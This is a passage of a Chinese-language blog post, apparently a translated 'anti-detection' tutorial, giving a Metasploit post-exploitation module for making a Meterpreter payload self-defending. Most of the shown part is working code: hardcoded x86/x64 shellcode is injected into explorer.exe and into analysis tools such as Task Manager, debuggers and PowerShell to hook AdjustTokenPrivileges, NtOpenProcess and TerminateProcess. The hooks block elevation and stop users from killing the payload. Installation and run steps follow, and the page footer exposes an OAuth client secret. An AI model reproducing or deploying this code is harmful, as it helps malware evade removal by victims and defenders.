class="line"><span class="preprocessor"># https:<span class="comment">//github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_api.asm</span></span></span><br><span class="line">block_api_64 = <span class="string">""</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48"</span></span><br><span class="line"><span class="preprocessor"># SNIP ...</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a"</span></span><br><span class="line">block_api_64 &lt;&lt; <span class="string">"\x48\x8b\x12\xe9\x4f\xff\xff\xff"</span></span><br></pre></td></tr></table></figure><br><br>我知道看起来很难看，如果您知道在利用漏洞利用模块中生成块API的更好方法，请告诉我。我还以相同的方式汇编并声明了我们准备的shellcode。<br><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">prevent_elevate_32 = <span class="string">""</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xfc\xe8\xb6\x00\x00\x00\x5b\xe8\x2f\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x89\xc6\x68\x10\xe1\x8a\xc3\xe8\x23\x00\x00\x00"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xc3\x5f\x5f\x5a\x8b\x12\xeb\x8e\x5d\x68\x2d\xf9"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x7f\xe5\xff\xd5\x68\x75\x1f\x0a\x33\xff\xd5\xe8"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x82\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; block_api_32</span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x5d\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05"</span></span><br><span class="line">prevent_elevate_32 &lt;&lt; <span class="string">"\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">prevent_elevate_64 = <span class="string">""</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xfc\xe8\x16\x01\x00\x00\x5b\xe8\x49\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x48\x83\xc4\x20\x48\x89\xc6\x41\xba\x10\xe1\x8a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xc3\xe8\x37\x00\x00\x00\x48\x83\xc4\x20\x6a\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x49\x89\xe1\x41\xb8\x40\x00\x00\x00\xba\x04\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x00\x00\x48\x89\xf1\xff\xd0\x58\xe8\x04\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x00\x48\x31\xc0\xc3\x5a\xb9\x04\x00\x00\x00\x8a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x02\x88\x06\x48\xff\xc6\x48\xff\xc2\xe2\xf4\x53"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xc3\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xf9\x7f\xe5\xff\xd5\x41\xba\x75\x1f\x0a\x33\xff"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xd5\xe8\xc8\x00\x00\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; block_api_64</span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x5d\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"</span></span><br><span class="line">prevent_elevate_64 &lt;&lt; <span class="string">"\x59\x41\x89\xda\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">self_defense_64 = <span class="string">""</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\xfc\xe8\xc8\x00\x00\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; block_api_64</span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x5d\x41\xba\x49\x47\xc6\x62\xff\xd5\x49"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x89\xc0\xba\x00\x00\x00\x00\xb9\xff\x00\x1f\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x41\xba\xee\x95\xb6\x50\xff\xd5\x48\x89\xc3\x6a"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x78\x69\x74\x55\x50\x48\x89\xe2\x41\xba\x49\xf7"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x02\x78\xff\xd5\x48\x89\xc5\xe8\x00\x00\x00\x00"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\x58\xb9\xb7\x01\x00\x00\xc6\x00\x00\x48\xff\xc8"</span></span><br><span class="line">self_defense_64 &lt;&lt; <span class="string">"\xe2\xf8\x6a\x00\xff\xd5"</span></span><br><span class="line"></span><br><span class="line">self_defense_32= <span class="string">""</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\xfc\xe8\x82\x00\x00\x00"</span></span><br><span class="line">self_defense_32 &lt;&lt; block_api_32</span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x5d\x68\x49\x47\xc6\x62\xff\xd5"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x50\x6a\x00\x68\xff\x0f\x1f\x00\x68\xee\x95\xb6"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x50\xff\xd5\x89\xc3\x6a\x00\x68\x70\x69\x33\x32"</span></span><br><span class="line"> <span class="preprocessor"># SNIP ...</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x5b\x0c\x8b\x43\x0c\xc7\x40\x20\xff\xff\xff\x00"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\xb9\x44\x01\x00\x00\xe8\x00\x00\x00\x00\x58\xc6"</span></span><br><span class="line">self_defense_32 &lt;&lt; <span class="string">"\x00\x00\x48\xe2\xfa\x6a\x00\xff\xd5"</span></span><br></pre></td></tr></table></figure><br><br>现在，在声明了shellcode之后，我们需要遍历所有进程并将shellcode注入可能导致我们麻烦的进程中。以下代码实现循环遍历所有进程，注入并钩住AdjustTokenPrivileges和RtlSetDaclSecurityDescriptor API的shellcode。我们使用client.sys.process.processes方法访问目标计算机上的进程信息。如果进程名称是explorer.exe或我们在顶部声明的任何分析工具，它将通过调用execute_shellcode函数来注入我们的shellcode。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">analysis_tools =['taskmgr.exe','procexp64.exe','ida.exe','ida64.exe','windbg.exe','x32dbg.exe','ollydbg.exe','tasklist.exe','cmd.exe','powershell.exe','cheatengine-x86_x64.exe']</span><br><span class="line"></span><br><span class="line">os = client.sys.config.sysinfo['OS']</span><br><span class="line">print_status("Target OS -&gt; #&#123;os&#125;")</span><br><span class="line"></span><br><span class="line">client.sys.process.processes.each do |p|</span><br><span class="line">  begin      </span><br><span class="line">    # Check Payload Arch</span><br><span class="line">    if 'explorer.exe' === p['name'].to_s.downcase or analysis_tools.include? p['name'].to_s.downcase</span><br><span class="line">      print_status("Hooking RtlSetDaclSecurityDescriptor on #&#123;p['name']&#125; (#&#123;p['arch']&#125;)")</span><br><span class="line">      print_status("Hooking AdjustTokenPrivileges on #&#123;p['name']&#125; (#&#123;p['arch']&#125;)")</span><br><span class="line">      if 'x64' === p['arch'].to_s</span><br><span class="line">        execute_shellcode(prevent_elevate_64,nil,p['pid'].to_i)</span><br><span class="line">      else</span><br><span class="line">        execute_shellcode(prevent_elevate_32,nil,p['pid'].to_i)</span><br><span class="line">      end</span><br><span class="line">      print_good("UAC elevation disabled for #&#123;p['name']&#125;")</span><br><span class="line">    end</span><br><span class="line">  rescue =&gt; e</span><br><span class="line">    print_error("API hooking failed: #&#123;e&#125;")</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>现在，我们需要考虑运行的操作系统版本是否高于Windows 7的情况。我们可以通过访问client.sys.config.sysinfo [‘OS’]结构来简单地进行检查。我们将检查版本字符串，并决定是使用保护进程方法还是使用挂钩API的方法。如果我们需要挂钩NtOpenProcess和TerminateProcess API，我们可以简单地在API挂钩shellcode中更改函数名称哈希。<br><br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">if os.to_s.include? "Windows 7" or os.to_s.include? "Windows XP" or os.to_s.include? "2008"</span><br><span class="line">  client.sys.process.processes.each do |p|</span><br><span class="line">    # Check Payload Arch</span><br><span class="line">    if pid.to_i === p['pid'].to_i</span><br><span class="line">      print_status('Injecting self defense shellcode...')</span><br><span class="line">      if 'x64' === p['arch'].to_s</span><br><span class="line">        execute_shellcode(self_defense_64,nil,pid)</span><br><span class="line">      else</span><br><span class="line">        execute_shellcode(self_defense_32,nil,pid)</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  print_good('Self defense active !')</span><br><span class="line">else</span><br><span class="line">  # Set NtOpenProcess &amp; TerminateProcess hashes</span><br><span class="line">  prevent_terminate_64 = prevent_elevate_64.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"</span><br><span class="line">  prevent_terminate_32 = prevent_elevate_32.sub! "\x2D\xF9\x7F\xE5", "\x87\xDC\xCA\x5E"</span><br><span class="line"></span><br><span class="line">  prevent_terminate_64 = prevent_elevate_64.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"</span><br><span class="line">  prevent_terminate_32 = prevent_elevate_32.sub! "\x75\x1F\x0A\x33", "\xA3\x9D\xA1\x23"</span><br><span class="line"></span><br><span class="line">  hooked = ""</span><br><span class="line">  while 1</span><br><span class="line">    client.sys.process.processes.each do |p|</span><br><span class="line">      # Check Payload Arch</span><br><span class="line">      if analysis_tools.include? p['name'].to_s.downcase</span><br><span class="line">        print_status("Hooking TerminateProcess on #&#123;p['name']&#125; (#&#123;p['arch']&#125; - #&#123;p['pid']&#125;)")</span><br><span class="line">        print_status("Hooking NtOpenProcess on #&#123;p['name']&#125; (#&#123;p['arch']&#125; - #&#123;p['pid']&#125;)")</span><br><span class="line">        begin</span><br><span class="line">          if 'x64' === p['arch'].to_s</span><br><span class="line">            execute_shellcode(prevent_terminate_64,nil,p['pid'].to_i)</span><br><span class="line">          else</span><br><span class="line">            execute_shellcode(prevent_terminate_32,nil,p['pid'].to_i)</span><br><span class="line">          end</span><br><span class="line">          hooked &lt;&lt; p['pid'].to_s+','</span><br><span class="line">          print_good("Process termination disabled for #&#123;p['name']&#125;")</span><br><span class="line">        rescue =&gt; e</span><br><span class="line">          print_error("API hooking failed: #&#123;e&#125;")</span><br><span class="line">        end</span><br><span class="line">      end</span><br><span class="line">    end</span><br><span class="line">    if not datastore['LOOP']</span><br><span class="line">      break</span><br><span class="line">    end           </span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><br><br>在替换函数哈希时，请记住字节序问题，哈希值将以相反的顺序存储。当您查看上面的源代码时，您会发现在while条件内调用execute_shellcode函数，该条件取决于我们post模块的LOOP参数。这种机制是必要的，因为当用户在执行我们的模块后创建新的任务管理器进程时，该进程仍将能够终止其他进程。因此，我们需要一种将对抗终止进程shellcode持续注入到新创建的过程中的机制。仅对于反进程终止shellcode才需要使用此代码，因为其他代码已注入到资源管理器和我们自己的进程中，因此用户不太可能重新启动资源管理器。最后，这是我们的post模块的最后一部分。这是最终的self_defense.rb模块。只需将其移至~/.msf4/modules/post/windows目录下，即可将其添加到Metasploit。下面我们来看操作步骤。<br>首先，我们执行Meterpreter载荷。<br><div align="center"><br><img src="/img/anti_av4_exec_meterpreter.gif" align><br></div>
+
+<p>启动会话后，我们通过键入以下内容执行模块run post/windows/self_defense.</p>
+<p><div align="center"><br><img src="/img/anti_av4_self_defense.gif" align><br></div><br>现在，我们的载荷受到了保护，用户无法以管理员身份终止程序。<br>可以通过各种方式来改进此模块，尤其是可以使用简单的机制来检查handle参数并仅在将进程句柄传递给函数时才禁用它，而不是直接禁用OpenProcess API。同样，除了将我们的shellcode硬编码到模块源中之外，还有一种更动态的方式来生成它们。特别是集成Metasploit的有效载荷编码功能，可以使我们在每次执行时生成唯一的shellcode。我将在存储库中添加新的自保护shellcode。</p>
+<h2 id="参考">参考</h2><ul>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput</a></li>
+<li><a href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client" target="_blank" rel="external">https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora" target="_blank" rel="external">https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora</a></li>
+<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secauthz/security-descriptor-string-format</a></li>
+<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/s-gly</a></li>
+<li><a href="https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly" target="_blank" rel="external">https://docs.microsoft.com/tr-tr/windows/win32/secgloss/d-gly</a></li>
+</ul>
+<p><em>原文链接：<a href="https://pentest.blog/art-of-anti-detection-4-self-defense/" target="_blank" rel="external">https://pentest.blog/art-of-anti-detection-4-self-defense/</a></em></p>
+
+      
+    </div>
+    <footer>
+      
+
+        
+        
+          <div class="alignright post-nav">
+            <em>下一篇: </em><a href="/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/">反检测的艺术3-shellcode的魔力 （翻译）</a>
+          </div>
+          <div class="clearfix"></div>
+        
+
+        
+          <div class="copyright">
+            
+              <span class="claim">转载请注明youngroe.com</span>
+            
+            
+              <span class="from-link">
+                <em>本文链接地址:</em>
+                <a href="/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/">
+                  http://www.youngroe.com/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/
+                </a>
+              </span>
+            
+          </div>
+        
+        
+  
+  <div class="categories">
+    <a href="/categories/Cybersecurity/">Cybersecurity</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/反病毒/">反病毒</a>
+  </div>
+
+        
+          <! -- 添加捐赠图标 -->
+<div class ="post-donate">
+    <div id="donate_board" class="donate_bar center">
+        <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏"></a>
+        <span class="donate_txt">
+           ↑<br>
+           欣赏此文？求鼓励，求支持！
+        </span>
+        <br>
+      </div>  
+    <div id="donate_guide" class="donate_bar center hidden" >
+        <!-- 方式一： 
+            ![](/img/Alipay.jpg)
+            ![](/img/WeChatpay.jpg)
+        -->
+        <!-- 方式二；
+            step1：在_config.yml中添加配置
+                Alipay: /img/Alipay.jpg
+                WeChatpay: /img/WeChatpay.jpg
+            step2：此处两张图片的路径分别设置为如下
+                <img src="undefined"
+                <img src="undefined"
+        -->
+        <!-- 支付宝打赏图案 -->
+        <img src="/img/Alipay.png" alt="支付宝打赏">
+        <!-- 微信打赏图案 -->
+        <img src="/img/WeChatpay.png" alt="微信打赏">
+    </div>
+    <script type="text/javascript">
+        document.getElementById('btn_donate').onclick = function(){
+            $('#donate_board').addClass('hidden');
+            $('#donate_guide').removeClass('hidden');
+        }
+    </script>
+</div>
+<! -- 添加捐赠图标 -->
+        
+        <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+  clientID: '503c39aa3fb2b8c1b734',
+  clientSecret: '65d784ff7a95a9dbf4a4208c9e32166ca29654f2',
+  repo: 'geemion.github.io',
+  owner: 'geemion',
+  admin: 'geemion',
+  pagerDirection:'first',
+  id: md5(window.location.pathname)
+})
+
+gitalk.render('gitalk-container')
+</script>
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+  <div id="container"></div>
+</span>
+</article>
+
+
+<section id="comment">
+</section>
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/Cybersecurity/">Cybersecurity</a><small>5</small></li>
+  
+    <li><a href="/categories/Debug/">Debug</a><small>7</small></li>
+  
+    <li><a href="/categories/Kernel/">Kernel</a><small>4</small></li>
+  
+    <li><a href="/categories/Learning/">Learning</a><small>8</small></li>
+  
+    <li><a href="/categories/Life/">Life</a><small>6</small></li>
+  
+    <li><a href="/categories/Others/">Others</a><small>1</small></li>
+  
+    <li><a href="/categories/Tools/">Tools</a><small>6</small></li>
+  
+    <li><a href="/categories/Vulnerabilities/">Vulnerabilities</a><small>0</small></li>
+  
+    <li><a href="/categories/Windows/">Windows</a><small>13</small></li>
+  
+    <li><a href="/categories/life/">life</a><small>0</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2020/10/02/Cybersecurity/art-of-anti-detection-4-art-of-anti-detection-4-self-defense/">反检测的艺术4-自保护（翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/09/10/Cybersecurity/art-of-anti-detection-3-art-of-anti-detection-3-shellcode-alchemy/">反检测的艺术3-shellcode的魔力 （翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/09/04/Cybersecurity/art-of-anti-detection-2-pe-backdoor-manufacturing/">反检测的艺术2-如何制作PE文件后门（翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/09/03/Cybersecurity/art-of-anti-detection-1-introduction-to-av-detection-techniques/">反检测的艺术1-反病毒软件及检测技术概述（翻译）</a>
+      </li>
+    
+      <li>
+        <a href="/2020/08/02/Life/dns_hijacking/">记录一次被DNS劫持及解决方案(非改hosts方式)</a>
+      </li>
+    
+      <li>
+        <a href="/2019/07/01/Windows/delphi_reverse_summary/">Delphi程序逆向反汇编技巧小记</a>
+      </li>
+    
+      <li>
+        <a href="/2019/06/25/Kernel/kernel_enum_wfp_callout_function/">Windows内核重拾：如何枚举系统中Windows Filtering Platform (WFP)驱动中的callout函数</a>
+      </li>
+    
+      <li>
+        <a href="/2019/05/06/Kernel/windows-driver-testing-basics/">Windows内核重拾：Windows驱动测试基础：工具、功能和示例（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/">如何正确的对Windows软件进行逆向工程（翻译/转载）</a>
+      </li>
+    
+      <li>
+        <a href="/2019/01/12/Windows/a_crash_lead_deadlock/">Windows平台下一个崩溃而导致的死锁分析</a>
+      </li>
+    
+      <li>
+        <a href="/2018/12/01/Windows/windows_client_dns_over_https/">Windows客户端如何透明使用DNS-over-HTTPS</a>
+      </li>
+    
+      <li>
+        <a href="/2018/10/06/Cybersecurity/ddos-protection-techniques/">现代DDoS对抗技术概述（翻译/转载）</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/ASM/" style="font-size: 10px;">ASM</a> <a href="/tags/Boost/" style="font-size: 10px;">Boost</a> <a href="/tags/DDoS/" style="font-size: 10px;">DDoS</a> <a href="/tags/DNS-over-HTTPS/" style="font-size: 10px;">DNS-over-HTTPS</a> <a href="/tags/DNS劫持/" style="font-size: 10px;">DNS劫持</a> <a href="/tags/Delphi/" style="font-size: 10px;">Delphi</a> <a href="/tags/Dll劫持/" style="font-size: 10px;">Dll劫持</a> <a href="/tags/GCC-GDB/" style="font-size: 10px;">GCC&GDB</a> <a href="/tags/GetVersionEx/" style="font-size: 10px;">GetVersionEx</a> <a href="/tags/Http/" style="font-size: 10px;">Http</a> <a href="/tags/IDA-Pro/" style="font-size: 12.5px;">IDA Pro</a> <a href="/tags/Linux/" style="font-size: 15px;">Linux</a> <a href="/tags/MSDN/" style="font-size: 12.5px;">MSDN</a> <a href="/tags/Malware/" style="font-size: 12.5px;">Malware</a> <a href="/tags/MiniDumpWriteDump/" style="font-size: 10px;">MiniDumpWriteDump</a> <a href="/tags/PEB/" style="font-size: 10px;">PEB</a> <a href="/tags/Procmon/" style="font-size: 10px;">Procmon</a> <a href="/tags/Runtime-Error/" style="font-size: 10px;">Runtime Error</a> <a href="/tags/SEH/" style="font-size: 10px;">SEH</a> <a href="/tags/SysinternalsSuite/" style="font-size: 10px;">SysinternalsSuite</a> <a href="/tags/Tips/" style="font-size: 10px;">Tips</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/UAF漏洞/" style="font-size: 10px;">UAF漏洞</a> <a href="/tags/VC/" style="font-size: 10px;">VC</a> <a href="/tags/Visual-Studio/" style="font-size: 12.5px;">Visual Studio</a> <a href="/tags/Windbg/" style="font-size: 10px;">Windbg</a> <a href="/tags/Windows/" style="font-size: 20px;">Windows</a> <a href="/tags/android/" style="font-size: 10px;">android</a> <a href="/tags/getaddrinfo/" style="font-size: 10px;">getaddrinfo</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/libeay32/" style="font-size: 10px;">libeay32</a> <a href="/tags/markdown/" style="font-size: 10px;">markdown</a> <a href="/tags/ndk/" style="font-size: 10px;">ndk</a> <a href="/tags/sublime-text3/" style="font-size: 10px;">sublime text3</a> <a href="/tags/x64/" style="font-size: 10px;">x64</a> <a href="/tags/体验/" style="font-size: 10px;">体验</a> <a href="/tags/内核/" style="font-size: 12.5px;">内核</a> <a href="/tags/内核结构/" style="font-size: 15px;">内核结构</a> <a href="/tags/反病毒/" style="font-size: 17.5px;">反病毒</a> <a href="/tags/安全机制/" style="font-size: 10px;">安全机制</a> <a href="/tags/异常处理/" style="font-size: 10px;">异常处理</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/服务/" style="font-size: 10px;">服务</a> <a href="/tags/权限/" style="font-size: 12.5px;">权限</a> <a href="/tags/栈溢出漏洞/" style="font-size: 10px;">栈溢出漏洞</a> <a href="/tags/测试/" style="font-size: 10px;">测试</a> <a href="/tags/漏洞调试/" style="font-size: 12.5px;">漏洞调试</a> <a href="/tags/生活/" style="font-size: 15px;">生活</a> <a href="/tags/脱壳/" style="font-size: 10px;">脱壳</a> <a href="/tags/西安/" style="font-size: 10px;">西安</a> <a href="/tags/计划/" style="font-size: 10px;">计划</a> <a href="/tags/读书/" style="font-size: 10px;">读书</a> <a href="/tags/调试/" style="font-size: 15px;">调试</a> <a href="/tags/转换/" style="font-size: 10px;">转换</a> <a href="/tags/进程/" style="font-size: 10px;">进程</a> <a href="/tags/逆向/" style="font-size: 10px;">逆向</a> <a href="/tags/重庆/" style="font-size: 10px;">重庆</a> <a href="/tags/驱动/" style="font-size: 15px;">驱动</a>
+  </div>
+</div>
+
+
+  <div class="widget tag">
+<h3 class="title">Links</h3>
+<ul class="entry">
+<li><a href="http://blog.ourren.com/" title="Ourren">Ourren</a></li>
+<li><a href="http://www.hyjal.net/" title="Hyjal">Hyjal</a></li>
+<li><a href="http://www.jianshu.com/users/fa15f4e416ae/latest_articles" title="Daemonceltics">Daemonceltics</a></li>
+<li><a href="http://papap.info/" title="isee">isee</a></li>
+</ul>
+</div>
+
+  <script type="text/javascript" id="clustrmaps" src="//cdn.clustrmaps.com/map_v2.js?u=putG&d=yoFnN6V-ovhL-H4e9_69LvkTiX4uX7rEYJ15yL3G1Wg"></script>
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <div id="go-pg-top"><i class="icon-arrow-up"></i></div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2021 Lyon
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript" charset="utf-8" src="/js/page.js"></script>
+
+</body>
+
+</html>
